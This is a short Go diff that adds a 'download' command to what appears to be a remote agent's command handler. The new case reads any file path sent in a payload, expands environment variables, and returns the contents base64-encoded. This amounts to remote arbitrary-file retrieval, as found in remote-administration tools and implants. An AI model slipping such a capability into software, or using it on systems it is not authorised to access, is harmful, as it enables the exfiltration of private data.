@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -420,6 +421,24 @@ func executeCommand(cmd Command) CommandResult {
 			result.Error = err.Error()
 		}
 		result.Result = info
+
+	case "download":
+		path, _ := cmd.Payload["path"].(string)
+		if path == "" {
+			result.Error = "missing path payload"
+			return result
+		}
+		expanded := os.ExpandEnv(path)
+		data, err := os.ReadFile(expanded)
+		if err != nil {
+			result.Error = fmt.Sprintf("read error: %v", err)
+			return result
+		}
+		result.Result = map[string]string{
+			"name":    filepath.Base(expanded),
+			"content": base64.StdEncoding.EncodeToString(data),
+			"size":    fmt.Sprintf("%d", len(data)),
+		}
 
 	default:
 		result.Error = fmt.Sprintf("unknown command type: %s", cmd.Type)
